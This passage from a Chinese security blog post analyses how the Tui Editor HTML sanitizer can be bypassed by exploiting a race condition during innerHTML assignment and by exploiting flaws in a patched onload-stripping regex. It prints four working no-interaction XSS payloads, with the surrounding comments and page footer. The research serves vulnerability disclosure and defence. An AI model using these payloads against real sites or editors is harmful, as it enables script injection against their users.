<p><a href="../media/attachment/2021/08/06/f30b3461-7120-470d-a22b-38fb2f4f1bed.png"><img alt="image-20210730030617037.png" src="../media/attachment/2021/08/06/f30b3461-7120-470d-a22b-38fb2f4f1bed.547d9cb5b7e9.png" /></a></p>
<p>另外，Dom Clobbering也无法用来劫持函数，所以这个思路也无疾而终了。</p>
<p>最终我还是没找到利用Dom Clobbering来绕过Tui Editor的XSS sanitizer的方法，如果大家有好的想法，可以下来和我交流。</p>
<h2 id="0x04"><a class="toclink" href="#0x04">0x04 基于条件竞争的绕过方式</a></h2>
<p>到现在，我仍然没有找到一个在Tui Editor中执行无交互XSS的方法。</p>
<p>这个时候我开始翻history，我发现就在不到一个月前，Tui Editor曾对HTML sanitizer进行了<a href="https://github.com/nhn/tui.editor/pull/1670">修复</a>，备注是修复XSS漏洞，代码改动如下：</p>
<p><a href="../media/attachment/2021/08/06/ef97bd09-d92e-4d98-a252-382f5b4fdcd3.png"><img alt="image-20210730031422394.png" src="../media/attachment/2021/08/06/ef97bd09-d92e-4d98-a252-382f5b4fdcd3.c84b25831d20.png" /></a></p>
<p>在将字符串html赋值给<code>root.innerHTML</code>前，对这个字符串进行了正则替换，移除其中的<code>onload=</code>关键字。</p>
<p>我最开始不是很明白这样做的用意，因为onload这个属性在后面白名单移除的时候会被删掉，在这里又做一次删除到底意义何在。后来看到了单元测试的case并进行调试以后，我才明白了原因。</p>
<p>在Tui Editor的单元测试中增加了这样一个case：</p>
<div class="codehilite"><pre><span></span><code><span class="p">&lt;</span><span class="nt">svg</span><span class="p">&gt;&lt;</span><span class="nt">svg</span> <span class="na">onload</span><span class="o">=</span><span class="s">alert(1)</span><span class="p">&gt;</span>
</code></pre></div>

<p>平平无奇，但我将其放到未修复的HTML sanitizer中竟然绕过了属性白名单，成功执行。这也是我在知识星球的<a href="https://t.zsxq.com/ZvNrRj2">XSS小挑战</a>中讲到的那个小trick，条件竞争。</p>
<p>这里所谓的“条件竞争”，竞争的其实就是这个onload属性在被放进DOM树中开始，到在后续移除函数将其移除的中间这段时间——只要这段代码被放进innerHTML后立即触发onload，这样即使后面它被移除了，代码也已经触发执行了。</p>
<p>那么想要找到这样一个Payload，它需要满足下面两个条件：</p>
<ul>
<li>在代码被放进innerHTML的时候会被触发</li>
<li>事件触发的时间需要在被移除以前</li>
</ul>
<p>第一个条件很好满足，比如最常用的XSS Payload <code>&lt;img src=1 onerror=alert(1)&gt;</code>，它被插入进innerHTML的时候就可以触发，而无需等待这个root节点被写入页面：</p>
<div class="codehilite"><pre><span></span><code><span class="kd">const</span> <span class="nx">root</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">createElement</span><span class="p">(</span><span class="s1">&#39;div&#39;</span><span class="p">);</span>
<span class="nx">root</span><span class="p">.</span><span class="nx">innerHTML</span> <span class="o">=</span> <span class="sb">`&lt;img src=1 onerror=alert(1)&gt;`</span>
</code></pre></div>

<p>相比起来，<code>&lt;svg onload=alert(1)&gt;</code>、<code>&lt;script&gt;alert(1)&lt;/script&gt;</code>这两个Payload就无法满足这一点。具体原因我在星球里也说到过，可以翻翻帖子。</p>
<p>第二个条件更加玄学，以至于我虽然知道一些可以利用的Payload，但并不知道它为什么可以利用。</p>
<p><code>&lt;img&gt;</code>的Payload是无法满足第二个条件的，因为onerror是在src加载失败的时候触发，中间存在IO操作时间比较久，所以肯定无法在onerror被移除前完成。相对的，下面这两个Payload可以满足条件：</p>
<div class="codehilite"><pre><span></span><code><span class="p">&lt;</span><span class="nt">svg</span><span class="p">&gt;&lt;</span><span class="nt">svg</span> <span class="na">onload</span><span class="o">=</span><span class="s">alert(1)</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="nt">details</span> <span class="na">open</span> <span class="na">ontoggle</span><span class="o">=</span><span class="s">alert(1)</span><span class="p">&gt;</span>
</code></pre></div>

<p>第一个是我前面说过的方法，第二个是后面测试的时候发现的一种方法。</p>
<h2 id="0x05-tui-editor"><a class="toclink" href="#0x05-tui-editor">0x05 Tui Editor补丁绕过</a></h2>
<p>那么很幸运，<code>&lt;details open ontoggle=alert(1)&gt;</code>这个Payload满足了两个条件，成为可以竞争过remove的一个Payload。而Tui Editor因为只考虑了双svg的Payload，所以可以使用它轻松绕过最新的补丁，构造一个无交互XSS。</p>
<p>那么我是否还能再找到一种绕过方式呢？</p>
<p>回看Tui Editor针对<code>&lt;svg&gt;&lt;svg onload=alert(1)&gt;</code>这个Payload的修复方式：</p>
<div class="codehilite"><pre><span></span><code><span class="k">export</span> <span class="kd">const</span> <span class="nx">TAG_NAME</span> <span class="o">=</span> <span class="s1">&#39;[A-Za-z][A-Za-z0-9-]*&#39;</span><span class="p">;</span>
<span class="kd">const</span> <span class="nx">reXSSOnload</span> <span class="o">=</span> <span class="k">new</span> <span class="nb">RegExp</span><span class="p">(</span><span class="sb">`(&lt;</span><span class="si">${</span><span class="nx">TAG_NAME</span><span class="si">}</span><span class="sb">[^&gt;]*)(onload\\s*=)`</span><span class="p">,</span> <span class="s1">&#39;ig&#39;</span><span class="p">);</span>

<span class="k">export</span> <span class="kd">function</span> <span class="nx">sanitizeHTML</span><span class="p">(</span><span class="nx">html</span>: <span class="kt">string</span><span class="p">)</span> <span class="p">{</span>
    <span class="kd">const</span> <span class="nx">root</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">createElement</span><span class="p">(</span><span class="s1">&#39;div&#39;</span><span class="p">);</span>

    <span class="k">if</span> <span class="p">(</span><span class="nx">isString</span><span class="p">(</span><span class="nx">html</span><span class="p">))</span> <span class="p">{</span>
        <span class="nx">html</span> <span class="o">=</span> <span class="nx">html</span><span class="p">.</span><span class="nx">replace</span><span class="p">(</span><span class="nx">reComment</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">).</span><span class="nx">replace</span><span class="p">(</span><span class="nx">reXSSOnload</span><span class="p">,</span> <span class="s1">&#39;$1&#39;</span><span class="p">);</span>
        <span class="nx">root</span><span class="p">.</span><span class="nx">innerHTML</span> <span class="o">=</span> <span class="nx">html</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="c1">// ...</span>
<span class="p">}</span>
</code></pre></div>

<p>增加了一个针对onload的正则<code>(&lt;[A-Za-z][A-Za-z0-9-]*[^&gt;]*)(onload\\s*=)</code>，将匹配上这个正则的字符串中的<code>onload=</code>移除。</p>
<p>这个正则是有问题的，主要问题有3个，我根据这两个问题构造了3种绕过方法。</p>
<h3 id="_1"><a class="toclink" href="#_1">贪婪模式导致的绕过</a></h3>
<p>我发现这个正则在标签名<code>[A-Za-z][A-Za-z0-9-]*</code>的后面，使用了<code>[^&gt;]*</code>来匹配非<code>&gt;</code>的所有字符。我大概明白他的意思，他就是想忽略掉所有不是onload的字符，找到下一个onload。</p>
<p>但是还记得正则里的贪婪模式吧，默认情况下，正则引擎会尽可能地多匹配满足当前模式的字符，所以，如果此时有两个<code>onload=</code>，那么这个<code>[^&gt;]*</code>将会匹配到第二个，而将它删除掉，而第一个<code>onload=</code>将被保留。</p>
<p>所以，构造如下Payload将可以绕过补丁：</p>
<div class="codehilite"><pre><span></span><code><span class="p">&lt;</span><span class="nt">svg</span><span class="p">&gt;&lt;</span><span class="nt">svg</span> <span class="na">onload</span><span class="o">=</span><span class="s">alert(1)</span> <span class="na">onload</span><span class="o">=</span><span class="s">alert(2)</span><span class="p">&gt;</span>
</code></pre></div>

<h3 id="_2"><a class="toclink" href="#_2">替换为空导致的问题</a></h3>
<p>那么如果将贪婪模式改成非贪婪模式，是否能解决问题呢？</p>
<div class="codehilite"><pre><span></span><code><span class="p">(</span><span class="o">&lt;</span><span class="p">[</span><span class="n">A</span><span class="o">-</span><span class="n">Za</span><span class="o">-</span><span class="n">z</span><span class="p">][</span><span class="n">A</span><span class="o">-</span><span class="n">Za</span><span class="o">-</span><span class="n">z0</span><span class="o">-</span><span class="mi">9</span><span class="o">-</span><span class="p">]</span><span class="o">*</span><span class="p">[</span><span class="o">^&gt;</span><span class="p">]</span><span class="o">*</span><span class="err">?</span><span class="p">)(</span><span class="n">onload</span>\\<span class="n">s</span><span class="o">*=</span><span class="p">)</span>
</code></pre></div>

<p>看看这个正则，会发现它分为两个group，<code>(&lt;[A-Za-z][A-Za-z0-9-]*[^&gt;]*?)</code>和<code>(onload\\s*=)</code>，在用户的输入匹配上时，第二个group将会被删除，保留第一个group，也就是<code>$1</code>。</p>
<p>所以，即使改成非贪婪模式，删除掉的是第一个<code>onload=</code>，第二个<code>onload=</code>仍然会保留，所以无法解决问题，构造的Payload如下：</p>
<div class="codehilite"><pre><span></span><code><span class="p">&lt;</span><span class="nt">p</span><span class="p">&gt;&lt;</span><span class="nt">svg</span><span class="p">&gt;&lt;</span><span class="nt">svg</span> <span class="na">onload</span><span class="o">=</span><span class="s">onload=alert(1)</span><span class="p">&gt;&lt;/</span><span class="nt">svg</span><span class="p">&gt;&lt;/</span><span class="nt">svg</span><span class="p">&gt;&lt;/</span><span class="nt">p</span><span class="p">&gt;</span>
</code></pre></div>

<h3 id="_3"><a class="toclink" href="#_3">字符匹配导致的问题</a></h3>
<p>回看这个<code>[^&gt;]*</code>，作者的意思是一直往后找<code>onload=</code>直到标签闭合的位置为止，但是实际上这里有个Bug，一个HTML属性中，也可能存在字符<code>&gt;</code>，它不仅仅是标签的定界符。</p>
<p>那么，如果这个正则匹配上HTML属性中的一个<code>&gt;</code>，则会停止向后匹配，这样<code>onload=</code>也能保留下来。Payload如下：</p>
<div class="codehilite"><pre><span></span><code><span class="p">&lt;</span><span class="nt">svg</span><span class="p">&gt;&lt;</span><span class="nt">svg</span> <span class="na">x</span><span class="o">=</span><span class="s">&quot;&gt;&quot;</span> <span class="na">onload</span><span class="o">=</span><span class="s">alert(1)</span><span class="p">&gt;</span>
</code></pre></div>

<p>三种Payload都可以用于绕过最新版的Tui Editor XSS过滤器，再加上前面的<code>&lt;details open ontoggle=alert(1)&gt;</code>，总共已经有4个无需用户交互的POC了。</p>
<h2 id="0x06"><a class="toclink" href="#0x06">0x06 总结</a></h2>
<p>总结一下，Tui Editor的Viewer使用自己编写的HTML sanitizer来过滤Markdown渲染后的HTML，而这个sanitizer使用了很经典的先设置DOM的innerHTML，再过滤再写入页面的操作。</p>
<p>我先通过找到白名单中的恶意方法构造了需要点击触发的XSS Payload，又通过条件竞争构造了4个无需用户交互的XSS Payload。其中，后者能够成功的关键在于，一些恶意的事件在设置innerHTML的时候就瞬间触发了，即使后面对其进行了删除操作也无济于事。</p>
<p>虽然作者已经注意到了这一类绕过方法，并进行了修复，但我通过审计它的修复正则，对其进行了绕过。</p>
<p>这里要说的一点是，我最初只想到了使用<code>x="&gt;"</code>这种方法绕过正则，但在写文章的时候又想到了贪婪模式相关的方法。可以看出，写文章其实对于思考问题来说很有帮助，我在写一篇文章的时候会考虑的更加全面，这个经验也推荐给大家。</p>
          </div>
        </article>

        
          <h1 class="h1 color-main">赞赏</h1>
          <div class="zan text-center">
            <p>喜欢这篇文章？打赏1元</p>
            <p class="m-0"><img src="../static/wx.jpg" width="280" alt=""></p>
          </div>
        

        <div id="reply-list">
          <h1 class="h1 color-main">评论</h1>
          
            
              <div class="flex mb-2" id="comment-3867">
                <div class="gravatar">
                  <img src="../static/placeholder.jpg" width="40px" height="40px" alt="">
                </div>
                <div class="ps-2">
                  <p class="comment-meta title">
                    <a href="" target="_blank" rel="nofollow noopener">笔记本</a>
                    <time datetime="2022年5月10日 16:28" itemprop="datePublished">
                      2022 五月 10 16:28
                    </time>
                    <a href="javascript:reply_to('3867', '%E7%AC%94%E8%AE%B0%E6%9C%AC')">回复</a>
                  </p>
                  <p class="comment-meta">太牛了</p>
                </div>
              </div>
              
            
              <div class="flex mb-2" id="comment-3678">
                <div class="gravatar">
                  <img src="../static/placeholder.jpg" width="40px" height="40px" alt="">
                </div>
                <div class="ps-2">
                  <p class="comment-meta title">
                    <a href="" target="_blank" rel="nofollow noopener">kriller</a>
                    <time datetime="2021年8月11日 22:36" itemprop="datePublished">
                      2021 八月 11 22:36
                    </time>
                    <a href="javascript:reply_to('3678', 'kriller')">回复</a>
                  </p>
                  <p class="comment-meta">拿起手机准备打钱，结果发现没有一元的选项hhh 伤心。。</p>
                </div>
              </div>
              
                
                  <div class="child-node">
              <div class="flex mb-2" id="comment-3679">
                <div class="gravatar">
                  <img src="https://secure.gravatar.com/avatar/c4267eb6d17276fa31c547ac71611e90.jpg?s=100&amp;d=mm&amp;r=g" width="40px" height="40px" alt="">
                </div>
                <div class="ps-2">
                  <p class="comment-meta title">
                    <a href="https://www.leavesongs.com" target="_blank" rel="nofollow noopener">phithon</a>
                    <time datetime="2021年8月11日 22:39" itemprop="datePublished">
                      2021 八月 11 22:39
                    </time>
                    <a href="javascript:reply_to('3679', 'phithon')">回复</a>
                  </p>
                  <p class="comment-meta">@kriller 你也知道，最近物价上涨了~~</p>
                </div>
              </div>
              
            </div>
                
              
            
              <div class="flex mb-2" id="comment-3672">
                <div class="gravatar">
                  <img src="https://secure.gravatar.com/avatar/d9cd7566046ddb23a751c39aa42df546.jpg?s=100&amp;d=mm&amp;r=g" width="40px" height="40px" alt="">
                </div>
                <div class="ps-2">
                  <p class="comment-meta title">
                    <a href="https://money1.us" target="_blank" rel="nofollow noopener">马内</a>
                    <time datetime="2021年8月6日 21:48" itemprop="datePublished">
                      2021 八月 06 21:48
                    </time>
                    <a href="javascript:reply_to('3672', '%E9%A9%AC%E5%86%85')">回复</a>
                  </p>
                  <p class="comment-meta">技术文章，学习了。<br>80% WordPress/Typecho，都是在讲开发</p>
                </div>
              </div>
              
            
          
        </div>

        

        <form method="post" enctype="multipart/form-data" action="#reply" id="reply" class="mb-4">
          <div class="container-fluid px-0">
            
            <div class="row">
              <div class="col">
                <textarea name="content" cols="40" rows="6" required id="id_content">
</textarea>
              </div>
            </div>
            <div class="row gx-2">
              <div class="col-4">
                <input type="text" name="nickname" placeholder="昵称" maxlength="64" required id="id_nickname">
              </div>
              <div class="col-4">
                <input type="text" name="email" placeholder="邮箱（可留空）" maxlength="254" id="id_email">
              </div>
              <div class="col-4">
                <input type="text" name="url" placeholder="链接（可留空）" maxlength="200" id="id_url">
              </div>
            </div>
          </div>
          <div class="row">
            <div class="col-4">
              <div class="row gx-2" style="margin-top: 8px"><div class="col-6"><input autocomplete="off" id="id_captcha_1" name="captcha_1" type="text" placeholder="验证码" /> <input id="id_captcha_0" name="captcha_0" type="hidden" value="4982a498860c8c9ac10599511c06e5038902e776" />
</div><div class="col-6">
<img src="../captcha/image/4982a498860c8c9ac10599511c06e5038902e776/index.png" alt="captcha" class="captcha" /></div></div>
            </div>
          </div>
          <div class="row">
            <div class="col">
              <input type="submit" class="ui-button ui-button-sgreen" value="提交">
            </div>
          </div>
          <input type="hidden" name="archive" value="465" id="id_archive">
          <input type="hidden" name="parent" id="id_parent">
          <input type="hidden" name="csrfmiddlewaretoken" value="UjjMNJeIwhZyIVHn2a7l5GRwDztYS1biGRHDlOPrUDdhgtvL4b4629UBYWK9rDnA">
        </form>
      </div>
    </div>
    <div class="row justify-content-center">
      <div class="col-lg-7 col-md-10 col-sm-12">
        <footer class="footer mx-auto">
  <div class="footer-left">
    Copyright &copy; 2023 Powered by talkbook
  </div>
  <div class="footer-right">
    <nav>
      <ul>
        <li><a href="../index.html">首页</a></li>
        <li><a href="../feed/index.rss" target="_blank">RSS订阅</a></li>
        <li><a href="http://weibo.com/101yx" target="_blank">微博</a></li>
        <li><a href="https://github.com/phith0n" target="_blank">项目</a></li>
        <li><a href="../index.html">更换模板</a></li>
      </ul>
    </nav>
  </div>
</footer>
      </div>
    </div>
  </div>

<script src="https://cdn.staticfile.org/jquery/2.2.4/jquery.min.js"></script>
<script src="../static/cactus/js/main%EF%B9%96v=2021102502.js"></script>
<!-- Global site tag (gtag.js) - Google Analytics -->
<script async src="https://www.googletagmanager.com/gtag/js?id=G-FF5KPQ1CZ6"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'G-FF5KPQ1CZ6');
</script>

  <script src="https://cdn.staticfile.org/fancybox/2.1.7/js/jquery.fancybox.min.js"></script>
  <script>
      $(document).ready(function () {
          $(".content a").each(function (i, e) {
              if (e.host != 'www.leavesongs.com') {
                  e.target = '_blank';
              }
          });
          $(".content img").each(function (i, e) {
              if (e.parentNode.tagName.toUpperCase() != 'A') {
                  $(e).wrap('<a href="' + escapeHtml(e.src) + '" class="fancybox"></a>');
              } else {
                  $(e.parentNode).addClass('fancybox');
              }
          });
          $('.fancybox').fancybox();
      })
  </script>

</body>
</html>